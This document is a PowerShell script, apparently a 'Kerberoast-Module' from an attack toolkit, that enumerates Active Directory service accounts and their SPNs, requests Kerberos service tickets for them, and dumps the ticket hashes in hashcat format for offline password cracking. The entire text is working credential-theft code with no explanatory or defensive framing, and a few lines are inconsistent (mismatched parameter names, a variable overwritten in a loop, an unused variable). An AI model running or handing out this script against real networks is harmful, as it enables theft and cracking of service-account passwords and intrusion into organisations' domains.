$SPN=Find-PSServiceAccounts -DumpSPN | out-string
Add-Type -AssemblyName System.IdentityModel

$tickets=Find-PSServiceAccounts -DumpSPNs | ForEach-Object {

try{
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_
}
        catch{

        }

} | Out-String

$kerb=Invoke-Kerberoast -OutputFormat hashcat | fl | Out-String
(Invoke-Kerberoast -OutputFormat hashcat).Hash | ForEach-Object {$hash="`n`n############`n$_"  } | Out-String
$SPN2=(Invoke-Kerberoast).ServicePrincipalName | out-string
$out="Kerberoast-Module `n`n############`n$SPN`n`n############`n$tickets`n`n############`n$kerb$hash"

echo $out
